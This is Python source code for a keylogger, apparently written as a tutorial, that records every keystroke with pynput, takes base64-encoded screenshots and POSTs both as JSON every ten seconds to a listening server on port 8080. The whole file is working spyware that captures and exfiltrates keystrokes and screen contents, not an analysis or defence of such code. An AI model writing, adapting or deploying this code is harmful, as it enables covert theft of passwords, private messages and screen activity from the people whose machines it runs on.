# Install pynput using the following command: pip install pynput
# Import the mouse and keyboard from pynput
import base64
# To transform a Dictionary to a JSON string we need the json package.
import json
import subprocess
# The Timer module is part of the threading package.
import threading
from io import BytesIO

# We need to import the requests library to Post the data to the server.
import requests
# Import the Pillow library for capturing screenshots
from PIL import ImageGrab
from pynput import keyboard

# We make a global variable text where we'll save a string of the keystrokes which we'll send to the server.
# Time interval in seconds for code to execute.
time_interval = 10
text = ""


def get_wsl_host_ip():
    try:
        # Run the shell command to get the WSL host IP address
        result = subprocess.run(['wsl', 'hostname', '-I'], capture_output=True, text=True)
        # Debug output: print the raw output from the command
        print(f"Command output: '{result.stdout}'")

        # Extract the IP address from the output
        ip_address = result.stdout.split()[0]
        return ip_address
    except Exception as e:
        print(f"An error occurred while fetching the IP address: {e}")
        return None


def capture_screenshot():
    # Capture the screenshot
    screenshot = ImageGrab.grab()
    # Save the screenshot to a BytesIO object
    buffered = BytesIO()
    screenshot.save(buffered, format="PNG")
    # Encode the screenshot in base64
    img_str = base64.b64encode(buffered.getvalue()).decode("utf-8")
    return img_str

def send_post_req():
    ip_address = get_wsl_host_ip()
    port_number = "8080"
    try:
        # Capture the screenshot
        screenshot_data = capture_screenshot()
        # We need to convert the Python object into a JSON string. So that we can POST it to the server. Which will look for JSON using
        # the format {"keyboardData" : "<value_of_text>", "screenshot": "<base64_encoded_screenshot>"}
        payload = json.dumps({"keyboardData": text, "screenshot": screenshot_data})
        # We send the POST Request to the server with IP address which listens on the port as specified in the Express server code.
        # Because we're sending JSON to the server, we specify that the MIME Type for JSON is application/json.
        r = requests.post(f"http://{ip_address}:{port_number}", data=payload,
                          headers={"Content-Type": "application/json"})
        # Setting up a timer function to run every <time_interval> specified seconds. send_post_req is a recursive function, and will call itself as long as the program is running.
        timer = threading.Timer(time_interval, send_post_req)
        # We start the timer thread.
        timer.start()
    except Exception as e:
        print(f"An error occurred while sending the POST request: {e}")


# We only need to log the key once it is released. That way it takes the modifier keys into consideration.
def on_press(key):
    global text

    # Based on the key press we handle the way the key gets logged to the in memory string.
    # Read more on the different keys that can be logged here:
    # https://pynput.readthedocs.io/en/latest/keyboard.html#monitoring-the-keyboard
    if key == keyboard.Key.enter:
        text += "\n"
    elif key == keyboard.Key.tab:
        text += "\t"
    elif key == keyboard.Key.space:
        text += " "
    elif key in {keyboard.Key.shift, keyboard.Key.alt, keyboard.Key.alt_r, keyboard.Key.alt_l, keyboard.Key.alt_gr,
                 keyboard.Key.right, keyboard.Key.left, keyboard.Key.up, keyboard.Key.down, keyboard.Key.ctrl_l,
                 keyboard.Key.ctrl_r}:
        pass
    elif key == keyboard.Key.backspace:
        if len(text) > 0:
            text = text[:-1]
    elif key == keyboard.Key.esc:
        return False
    else:
        # We do an explicit conversion from the key object to a string and then append that to the string held in memory.
        text += str(key).strip("'")


# A keyboard listener is a threading.Thread, and a callback on_press will be invoked from this thread.
# In the on_press function we specified how to deal with the different inputs received by the listener.
with keyboard.Listener(
        on_press=on_press) as listener:
    # We start by sending the post request to our server.
    send_post_req()
    listener.join()
